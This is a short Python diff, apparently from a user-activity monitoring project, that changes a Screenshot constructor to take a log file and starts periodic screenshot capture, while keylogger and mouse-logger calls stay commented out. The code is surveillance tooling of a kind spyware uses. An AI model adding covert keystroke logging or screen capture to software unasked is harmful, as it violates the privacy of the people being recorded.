@@ -6,5 +6,5 @@ if __name__ == "__main__":
 	#mouse_logger.start_mouse_listener()
 	#keyboard_logger = Keylogger("mouse_log.txt","keyboard_log.txt")
 	#keyboard_logger.start_listener()
-	screenshot = Screenshot("Screenshots", 5)
+	screenshot = Screenshot("Screenshots", 5, "screenshot_log.txt")
 	screenshot.start_screenshoting()
